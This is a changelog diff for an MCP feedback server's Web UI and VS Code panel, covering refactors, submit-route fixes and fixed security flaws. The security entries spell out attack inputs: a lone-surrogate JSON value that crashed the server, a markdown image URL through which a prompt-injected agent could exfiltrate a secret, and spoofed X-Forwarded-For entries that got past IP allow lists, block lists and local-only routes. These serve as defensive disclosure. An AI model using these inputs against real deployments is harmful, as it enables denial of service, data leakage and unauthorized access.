@@ -355,6 +355,49 @@ and the project adheres to [Semantic Versioning](https://semver.org/spec/v2.0.0.
   `test_extension_on_open_vsx_only_r840.py` (11 tests, 29 mutants killed), pins the four jobs of
   `release.yml`, that none of 18 user-facing files contains the word "marketplace", that no text
   file links this extension's Marketplace page and that each README names the VSIX install.
+- `[network_security]` is validated by one set of rules instead of two (R843). The Web UI's
+  access control ran `web_ui_validators`, and every read and save of the section ran
+  `ConfigManager._validate_network_security_config` first: ~200 lines with 36 branches, the same
+  loop copied for `allowed_networks`, `blocked_ips` and `trusted_hosts`, and small differences
+  between the copies (whitespace around an entry, duplicates, how an IPv4-mapped IPv6 address is
+  written, and what a value that is not a list turns into: the default LAN ranges in one, loopback
+  only in the other). The per-entry rules now exist once, in `web_ui_validators`
+  (`normalize_ip_entries`, `parse_bind_interface`, `validate_trusted_hosts`); the manager method is
+  down to choosing which value goes in and what to fall back to (a section that is not a list still
+  means loopback only, so a typo in the file does not open the LAN) and to cleaning the two
+  `api_token` keys, and the loopback fallback list is defined once. Compared with the previous code
+  on 200 000 random sections (blanks, non-strings, mapped addresses, duplicates, 5 000-digit
+  netmasks, control characters, values that are not lists), the section the access control enforces
+  is identical, except that `::ffff:1.2.3.4` and `1.2.3.4` now collapse into one entry; the
+  manager's own output is byte-identical for input without mapped addresses. Nothing changes for
+  the user. A new test, `test_network_validation_single_home_r843.py` (24 tests, 18 of which fail on
+  the previous code; 23 mutants killed together with `test_network_security_config.py`), pins the
+  normaliser, the two fallback policies side by side, a table of 19 sections with the enforced
+  result, and an AST scan that no second copy of the loops grows back; the one white-box test that
+  patched `ip_address` inside the manager module patches it where the parsing lives now.
+- Replacing a whole file atomically is written once (R844). `ConfigManager._save_config_immediate`,
+  `restore_config`, the `[network_security]` save and `TaskQueue._persist` each carried their own
+  copy of "temporary file beside the target, write, flush, fsync, `os.replace`, remove the
+  temporary file when anything fails", and the copies had drifted: the `[network_security]` save
+  called `os.fchmod` on the raw descriptor before wrapping it in a file object, so a mount that
+  refuses `fchmod` leaked one descriptor per failed save; the task queue cleaned up on `Exception`
+  only, so Ctrl-C or `SystemExit` between creating the temporary file and renaming it left a
+  `.tasks_*.tmp` (the prompts of the open tasks) in the data directory; and a config restore was the
+  only config write that reset a group-readable `config.toml` to 0600, where every save keeps the
+  mode (an existing file is left alone, R827). The sequence now lives in
+  `config_utils.atomic_write_text`: whatever interrupts it removes the temporary file and leaves
+  the old one, a failing cleanup never hides the original error, the mode of the replaced file is
+  kept for the three config writers (a restore included) and `tasks.json` is 0600 as before. The
+  file-system calls of the four writers were traced against the previous code (file mode 0600 and
+  0644, `fsync` failing or not): identical for the config save and the task queue, and the only
+  differences are `fchmod` after instead of before the file object in the network-security save
+  and the mode a restore keeps. A new test, `test_atomic_write_single_home_r844.py` (40 tests, 9 of
+  which fail on the previous call sites; 23 of 24 mutants killed, the 24th changes nothing
+  observable), pins the order of the calls (data flushed and synced while the old file is still in
+  place), what a failure at each step leaves behind (the old file, no temporary file, no open
+  descriptor, the error unchanged), the mode rules, the encoding under a C locale, and an AST scan
+  that the four call sites call the helper once and hold no copy of the sequence; the persistence
+  tests that looked for `f.flush()` and `os.replace` inside `_persist` look at the helper now.
 
 ### Removed
 
@@ -2665,6 +2708,58 @@ and the project adheres to [Semantic Versioning](https://semver.org/spec/v2.0.0.
   for users; the helper now does the same. 2 new tests (both red on the old helper) and 4 one-point
   mutants, all caught in every one of 6 runs.
 
+- **A submit answers "success" only when the queue took the answer (R846).**
+  `POST /api/tasks/<id>/submit` - the route the page and the VS Code view use - looks the task up and
+  then reads the form; the request body, uploads included, is received during that read. It then
+  called `TaskQueue.complete_task` and discarded what it returned. A task removed in between (the MCP
+  call gave up and closed it, the user closed it in another tab, the cleanup ran) made
+  `complete_task` return `False`, and the route still answered `200 {"success": true}`: the page
+  showed "submitted", cleared the text box and the selection, and nobody received the answer. The
+  window lasts as long as the upload does; a test reproduces it with nothing patched, by removing the
+  task when the handler first reads the body. Both submit routes now answer
+  `404 {"success": false, "error": "任务不存在"}`, which is what the task route already answered for
+  a task that was gone before the read, so the page shows a failure and keeps the draft. `/api/submit`
+  (the route the VS Code view falls back to, with the same task id) also stops leaving the refused
+  answer in `feedback_result`, from where `GET /api/feedback` would hand it out as submitted. 11 new
+  tests (6 red on the old code) and 10 one-point mutants, all caught; a source scan now rejects any
+  statement in the package that discards the result of `complete_task`.
+
+- **A task whose creation request got no answer is closed before the agent is told to call again
+  (R847).** `interactive_feedback` creates its task with `POST /api/tasks`; when that request failed
+  with an `httpx` error it returned the "call again" prompt and left it at that. For `ConnectError`
+  that is right (nothing listens), but a read timeout, a connection that breaks while the answer is
+  on its way, or a write that stops halfway all mean the Web UI got the request and the queue had
+  already taken the task. The agent called again, a second task with the same question queued behind
+  the first one, the person saw the first one (it is the active task), and what they typed went to a
+  task that no one was waiting for; the call that did wait got its answer only after they answered a
+  second time. It is the ghost-task loop that R13 closed for the wait and R775 for the cancellation,
+  here for the request that creates the task. The failure branch now closes what the call may have
+  created (`POST /api/tasks/<id>/close`, through the shielded runner of R775; a 404 when nothing was
+  created; any failure of the close is swallowed). A test reproduces it with the real routes behind
+  the client, losing only the answer to the creation. 10 new tests (8 red on the old code) and 7
+  one-point mutants (6 caught; the seventh is equivalent, the tool's outer handler gives the same
+  answer).
+
+- **A task keeps the first answer it receives; a later one is refused with 409 (R851).**
+  `TaskQueue.complete_task` took any number of answers for the same task. The second one replaced
+  the stored answer, set the completion time again (the ten-second retention started over), sent a
+  second completed event and returned `True`, and both submit routes answered
+  `200 {"success": true}`. The MCP call takes the answer as soon as the first completed event
+  arrives, so the second one reached no one: with a real MCP server and Web UI, two answers sent
+  1.5 s apart left the agent with the first and the Web UI with the second (4 runs of 4), and the
+  person who sent the second was told "submitted" and had the text box emptied; two answers sent in
+  the same moment gave the agent whichever the race let through. The second answer is what a second
+  browser tab, a double click, or the auto-resubmit countdown reaching zero just after a manual
+  submit sends (the loop ledger already kept only the first round for that case, while the task kept
+  the last answer). `complete_task` now decides under the write lock: the first caller gets `True`,
+  a completed task keeps its answer and its completion time and sends no more events, and any later
+  caller gets `False`. Both submit routes then ask one helper what to say: `404` for a task that is
+  gone and `409` with `"error": "task_already_answered"` and a message in the language of the
+  request for one that already has its answer, so the page reports a failure and keeps the draft,
+  and `/api/submit` leaves `feedback_result` as it was. The same probe now gets exactly one `200`
+  and one `409` in all 8 runs, and the agent always gets the answer that was accepted. 29 new tests
+  (25 red on the previous tree) and 30 one-point mutants, all caught.
+
 ### Security
 
 - Refresh `uv.lock` so the pull-request dependency gate
@@ -2768,6 +2863,89 @@ and the project adheres to [Semantic Versioning](https://semver.org/spec/v2.0.0.
   red on the old code, 25 pin what must stay: the phrases, the levels, the truncation itself, and a
   scan of the package for a log call at INFO or above that slices a prompt, message, option or
   answer) and 32 one-point mutants all caught.
+- One form field could stop the MCP server (R845). Python's `json.loads` turns an unpaired
+  surrogate escape (`"\ud800"`) into a string that has no UTF-8 encoding, and the Web UI read the
+  JSON text of the `selected_options` form field and every JSON body with it. (pydantic-core's
+  parser, the one the MCP stdio transport uses, refuses such input, so nothing arrives that way
+  from the agent.) Real stdio MCP server and real Web UI child, a question open, then
+  `POST /api/tasks/<id>/submit` with `selected_options=["ok", "a\ud800b"]` (the route the page and
+  the VS Code view use): answered `200 submitted`, then `mcp.server.stdio` could not write the tool
+  result (`PydanticSerializationError … surrogates not allowed`), its task group ended and the
+  server shut down together with the Web UI child and every queued task; the agent's call never
+  returned. Any client the access control lets in could do it with one request, and `/api/submit`
+  did the same. Through a JSON body the same value was stored as it came: `/api/update-feedback-config`
+  answered `200 updated` and the configuration then held a string `config.toml` cannot be written
+  with, so neither the delayed save nor the one at exit worked and every setting changed in that
+  session was lost (a traceback at exit); a task created with one, or a loop round answered with
+  one, made every write of `tasks.json` fail until a restart. Now each lone surrogate becomes
+  U+FFFD (what browsers and Werkzeug do with invalid UTF-8; a valid pair is untouched), at the
+  places text comes in: `loads_bounded` in `web_ui_routes/_request_body.py` is the one reader of
+  untrusted JSON text, for the app's JSON provider and for both `selected_options` parsers (the
+  depth bound of R828 and the repair, once; the task-scoped submit had no depth bound before), and
+  the MCP side repairs the result it fetches from the Web UI as well, since what answers there may
+  be another version. `text_safety.scrub_lone_surrogates` repairs documents in place with an
+  explicit stack, so a deep or a wide body costs neither recursion nor memory (a copy of a 10 MB
+  body of `[]` would be 200 MB). Real stack after: both submit routes answer 200, the tool returns
+  `选择的选项: ok, a�b …` and the server keeps answering. 77 tests (30 red on the previous code)
+  and 27 one-point mutants all caught.
+- The VS Code panel no longer fetches images from remote addresses (R848). Its content security
+  policy had `img-src data: ${serverUrl} https: ${cspSource}`, with the `https:` that the sample
+  policy of VS Code's webview guide has, so any `https:` image was allowed, and the prompt the
+  panel shows is text the agent wrote. `![x](https://host/p.png?d=...)` passes the panel's
+  sanitiser (it keeps the address of every `http(s)` image, and the `innerHTML` it starts with has
+  already fetched the image when it runs), so the panel sent the request from the person's machine
+  as soon as the prompt was shown, with whatever the agent had put in the address (an agent that a
+  web page it read has steered can write a secret it can see into it); no click was needed. The
+  Web UI in the browser never allowed this (`img-src 'self' data: blob:`). Real Chromium given the
+  exact policy of the old and of the new `webview.ts` and a page with a remote image, one made
+  through `innerHTML` on a detached element as the sanitiser does, an image from the server and a
+  `data:` image: the old policy decoded the remote image and the remote host received both
+  requests; the new one decoded none and received nothing, and the server's image and the `data:`
+  image still load. `img-src` is now `data: ${serverUrl} ${cspSource}`: what the panel shows is
+  what the server sends (the local images of R726), `data:` (attached files) and its own files. A
+  remote image is a broken-image icon, as it already was in the browser Web UI (said in
+  `docs/troubleshooting.md`). 26 new tests (5 red on the old policy: 25 read `webview.ts`, one runs
+  in the extension host on the HTML the provider renders) and 26 one-point mutants all caught.
+- Behind a reverse proxy on the same machine the Web UI judged a visitor by the first entry of
+  `X-Forwarded-For`, which is the one the visitor writes (R849). nginx's usual
+  `proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;` keeps what the visitor sent and
+  appends the address it saw on the right, so a visitor outside `allowed_networks` got in by
+  writing an allowed address in front of their own, a visitor in `blocked_ips` by writing an
+  allowed address in front of the blocked one, and the rate limiter gave every made-up first entry
+  a bucket of its own. Real Web UI process with `allowed_networks = ["203.0.113.0/24"]` and
+  `blocked_ips = ["203.0.113.66"]`, every request from `127.0.0.1` like a proxy on the same
+  machine: `203.0.113.7, 198.51.100.9` and `203.0.113.7, 203.0.113.66` were answered 200 and now get
+  403; 30 requests with 30 made-up first entries all got 200, now 10 get 200 and 20 get 429 (the
+  limit is 10 per second). The client is now the entry `network_security.trusted_proxy_hops` places
+  from the right (a new setting, a whole number from 0 to 8, default 1: one proxy next to the Web
+  UI; 2 is a CDN in front of nginx; 0 trusts no `X-Forwarded-For`; a header with fewer entries
+  gives its first one; anything else is read as 1 with a warning; an edit applies within 2 s), and
+  the access control and the rate limiter ask the same method, so they cannot disagree. A setup
+  with one proxy next to the Web UI needs no change. With two proxies in a row (a CDN in front of
+  nginx) set `trusted_proxy_hops = 2`, otherwise the Web UI judges the CDN's address and answers
+  403 to every visitor the allowed networks do not name. The proxy next to the Web UI must write
+  the header itself (`$remote_addr` or `$proxy_add_x_forwarded_for`), and the number must be the
+  count of proxies that really are in front: a larger one makes an entry the visitor wrote the
+  client. `docs/deployment.md` has a section on both. 30 new tests (26 red on the previous tree)
+  and 39 one-point mutants all caught.
+- The routes only this machine may call (`POST /api/system/rotate-api-token`,
+  `GET /api/system/api-token-info`, `POST /api/system/log-level`,
+  `POST /api/system/open-config-file` and its `/info`) took every visitor behind a reverse proxy
+  on the same machine for the machine itself (R850): they asked the connection's address, which is
+  `127.0.0.1` for every request the proxy forwards, so a visitor the access control let in could
+  rotate the API token (the old one stopped working and the new one was in the answer), read its
+  age, change the log level and use the settings page's Open-in-IDE button. Real Web UI process
+  with `allowed_networks = ["127.0.0.0/8", "203.0.113.0/24"]`, every request from `127.0.0.1` like
+  a proxy on the same machine: with `X-Forwarded-For: 203.0.113.7` or `127.0.0.1, 203.0.113.7` all
+  five routes were let in (200, or 400 where the request had nothing to change) and
+  `rotate-api-token` returned a new token; now all five answer 403 and no token is returned. These
+  routes now go by the address the access control judged (the one the rate limiter uses too): a
+  visitor is the machine itself when there is no proxy, or when the proxy wrote a loopback address
+  as the client (you browsing from the server), so nothing is let in that was not let in before. A
+  remote visitor behind the proxy runs them on the server
+  (`curl http://127.0.0.1:8080/api/system/api-token-info`) or sends the API token to the three that
+  take one; with `trusted_proxy_hops = 0` every request counts as the proxy itself, as before. 11
+  new tests (9 red on the previous tree) and 18 one-point mutants all caught.
 
 ## [1.8.12] - 2026-09-07
 
